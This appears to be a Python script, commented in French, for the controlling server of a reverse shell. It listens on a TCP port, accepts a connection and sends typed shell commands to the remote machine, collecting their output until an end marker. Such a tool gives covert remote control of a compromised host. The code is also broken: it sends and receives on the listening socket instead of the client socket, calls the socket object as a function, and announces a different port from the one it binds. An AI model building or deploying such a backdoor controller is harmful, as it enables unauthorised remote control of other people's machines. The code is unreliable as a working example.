

import socket
end_result = "<end-of-result>"
# 1. Création du socket TCP
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 2. Récupération de l'adresse IP (sans .split())
# Astuce : Tu peux entrer '0.0.0.0' pour écouter sur toutes tes interfaces réseau
server_ip = "192.168.1.185"
socket_connect = (server_ip, 3001)

# 3. Liaison (Bind) du socket à l'adresse et au port
server_socket.bind(socket_connect)

# 4. Mise en écoute (jusqu'à 10 connexions en attente)
server_socket.listen(10)
print(f"[*] Serveur en écoute sur {server_ip}:3000...")

# 5. Acceptation de la connexion client
# On utilise client_socket pour ne pas écraser server_socket
client_socket, client_address = server_socket.accept()

print(f"[+] Connexion réussie avec le client : {client_address}")
try :
    while True :
        command = input (">  ")
        server_socket.send(command.encode())
        if command == "q": 
            server_socket.close()
            break
        elif command =="":
            continue
        elif command.startswith("cd") :
            server_socket(command.encode())
            continue
        else :
            full_result = bytes()
            while True :
                chunk = server_socket.recv(1024)
                if chunk.endswith(end_result.encode()):
                    chunk = chunk[:-len(end_result)]
                    full_result += chunk
                    print(full_result.decode())
                    break
                else :
                    full_result += chunk
                    


          
except :
    print("exception error")
    server_socket.close()


